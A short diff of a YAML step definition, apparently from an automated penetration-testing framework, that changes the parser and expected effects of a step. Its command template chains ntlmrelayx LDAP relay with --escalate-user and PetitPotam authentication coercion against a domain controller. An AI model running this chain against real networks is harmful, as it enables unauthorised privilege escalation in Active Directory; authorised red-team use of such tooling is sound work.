@@ -8,9 +8,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user '{username}'
   && python3 PetitPotam.py {attacker_ip} {target_ip}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- coerced_auth
+- ntlm_captured
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
